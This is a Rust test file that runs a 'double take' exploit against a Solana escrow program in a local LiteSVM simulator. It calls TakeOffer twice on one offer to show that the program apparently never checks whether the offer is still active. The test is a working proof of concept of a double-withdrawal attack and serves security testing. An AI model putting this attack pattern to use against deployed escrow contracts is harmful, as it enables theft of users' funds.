// Exploit: Double Take (Missing Active State Check)
//
// Vulnerability: The program does not verify the offer is still active before processing.
// Attack: Taker calls TakeOffer twice on the same offer.
// Result: Taker receives tokens twice from the vault (or drains more than intended).
//
// Note: This exploit may fail if the vault is fully drained on first take,
// but the vulnerability is that the program doesn't check the is_initialized flag.

mod utils;

use utils::*; // import the utils

use litesvm_token::{
    spl_token::state::Account as TokenAccount,
    get_spl_account,
};
use solana_sdk::{
    instruction::{AccountMeta, Instruction},
    signature::Signer,
    transaction::Transaction,
};
use spl_associated_token_account::get_associated_token_address;
use solana_system_interface::program::ID as SYSTEM_PROGRAM_ID;


#[test]
fn test_exploit_double_take() {
    println!("\n=== EXPLOIT TEST: Double Take (Missing Active Check) ===\n");
    println!("[Scenario] Attacker tries to take the same offer twice");

    let mut scenario = setup_escrow_scenario();

    println!("[Setup] Creating initial offer...");

    // Create the offer first (legitimate)
    create_offer(
        &mut scenario.svm,
        &scenario.proposer,
        &scenario.mint_a,
        &scenario.mint_b,
        &scenario.proposer_ata_a,
        &scenario.offer_pda,
        &scenario.vault_ata,
        scenario.offer_id,
        scenario.bump,
    );

    // Verify vault has tokens
    let vault_balance: TokenAccount = get_spl_account(&scenario.svm, &scenario.vault_ata)
        .expect("Vault should exist");
    println!("[Setup] Vault Token A balance: {}", vault_balance.amount);

    // Record taker's initial balance
    let taker_a_before: TokenAccount = get_spl_account(&scenario.svm, &scenario.taker_ata_a)
        .expect("Taker ATA A should exist");
    println!("[Setup] Taker Token A before: {}", taker_a_before.amount);

    // Proposer's ATA B (will be created)
    let proposer_ata_b = get_associated_token_address(&scenario.proposer.pubkey(), &scenario.mint_b);

    // First TakeOffer (legitimate)
    println!("\n[Attack] First TakeOffer (legitimate)...");

    let take_ix_data = build_take_offer_data();

    let take_ix = Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(scenario.taker.pubkey(), true),
            AccountMeta::new(scenario.proposer.pubkey(), false),
            AccountMeta::new(proposer_ata_b, false),
            AccountMeta::new_readonly(scenario.mint_b, false),
            AccountMeta::new_readonly(scenario.mint_a, false),
            AccountMeta::new(scenario.taker_ata_a, false),
            AccountMeta::new(scenario.taker_ata_b, false),
            AccountMeta::new(scenario.offer_pda, false),
            AccountMeta::new(scenario.vault_ata, false),
            AccountMeta::new_readonly(TOKEN_PROGRAM_ID, false),
            AccountMeta::new_readonly(SYSTEM_PROGRAM_ID, false),
            AccountMeta::new_readonly(ASSOCIATED_TOKEN_PROGRAM_ID, false),
        ],
        data: take_ix_data.clone(),
    };

    let take_tx_1 = Transaction::new_signed_with_payer(
        &[take_ix.clone()],
        Some(&scenario.taker.pubkey()),
        &[&scenario.taker],
        scenario.svm.latest_blockhash(),
    );

    let result_1 = scenario.svm.send_transaction(take_tx_1);
    match &result_1 {
        Ok(metadata) => {
            println!("[Result] First TakeOffer succeeded");
            println!("[Result] Compute units: {}", metadata.compute_units_consumed);
        }
        Err(e) => {
            println!("[Result] First TakeOffer failed: {:?}", e);
            return;
        }
    }

    // Check taker's balance after first take
    let taker_a_after_first: TokenAccount = get_spl_account(&scenario.svm, &scenario.taker_ata_a)
        .expect("Taker ATA A should exist");
    println!("[Result] Taker Token A after first take: {}", taker_a_after_first.amount);

    // Second TakeOffer (EXPLOIT - should be rejected if active check existed)
    println!("\n[Attack] Second TakeOffer (EXPLOIT - same offer again)...");

    // Need to rebuild instruction for fresh signer
    let take_ix_2 = Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(scenario.taker.pubkey(), true),
            AccountMeta::new(scenario.proposer.pubkey(), false),
            AccountMeta::new(proposer_ata_b, false),
            AccountMeta::new_readonly(scenario.mint_b, false),
            AccountMeta::new_readonly(scenario.mint_a, false),
            AccountMeta::new(scenario.taker_ata_a, false),
            AccountMeta::new(scenario.taker_ata_b, false),
            AccountMeta::new(scenario.offer_pda, false),
            AccountMeta::new(scenario.vault_ata, false),
            AccountMeta::new_readonly(TOKEN_PROGRAM_ID, false),
            AccountMeta::new_readonly(SYSTEM_PROGRAM_ID, false),
            AccountMeta::new_readonly(ASSOCIATED_TOKEN_PROGRAM_ID, false),
        ],
        data: take_ix_data,
    };

    let take_tx_2 = Transaction::new_signed_with_payer(
        &[take_ix_2],
        Some(&scenario.taker.pubkey()),
        &[&scenario.taker],
        scenario.svm.latest_blockhash(),
    );

    let result_2 = scenario.svm.send_transaction(take_tx_2);
    match &result_2 {
        Ok(metadata) => {
            println!("[VULNERABLE] Second TakeOffer succeeded!");
            println!("[Result] Compute units: {}", metadata.compute_units_consumed);

            let taker_a_after_second: TokenAccount = get_spl_account(&scenario.svm, &scenario.taker_ata_a)
                .expect("Taker ATA A should exist");
            println!("[EXPLOIT SUCCESS] Taker Token A after second take: {}", taker_a_after_second.amount);
            println!("[EXPLOIT SUCCESS] Total tokens received: {}",
                taker_a_after_second.amount - taker_a_before.amount);
        }
        Err(e) => {
            // The offer might be closed or vault empty, so second take fails
            // But check WHY it failed - it should fail because "offer not active",
            // not because of runtime errors
            println!("[Result] Second TakeOffer failed: {:?}", e);

            //look into logs to get information without copying or consuming it
            
            let meta = &e.meta;

               println!("[Analysis] Logs:");

               for log in &meta.logs {
                     println!("           {}", log);
               }

        
                let logs_str = meta.logs.join(" ");
                if logs_str.contains("InvalidAccountData") {
                    println!("[Analysis] Failed due to account data issues (offer closed/vault empty)");
                    println!("[Analysis] A proper check would reject with 'offer not active' earlier");
                }
            
        }
    }

    println!("\n=== END: Double Take Exploit ===\n");
}
